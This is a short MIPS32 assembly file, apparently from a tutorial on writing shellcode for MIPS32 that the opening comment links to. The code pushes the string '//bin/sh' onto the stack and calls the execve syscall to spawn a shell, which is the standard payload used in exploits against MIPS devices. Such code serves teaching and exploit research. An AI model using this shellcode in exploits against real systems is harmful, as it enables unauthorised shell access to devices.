# https://fireshellsecurity.team/writing-a-shellcode-for-mips32/

.text
.globl __start
__start:
    lui $gp,0x40
    lui $sp,0x20
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  or $t4,$sp,$sp
  addiu $a0, $t4, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
# a0 001ffff4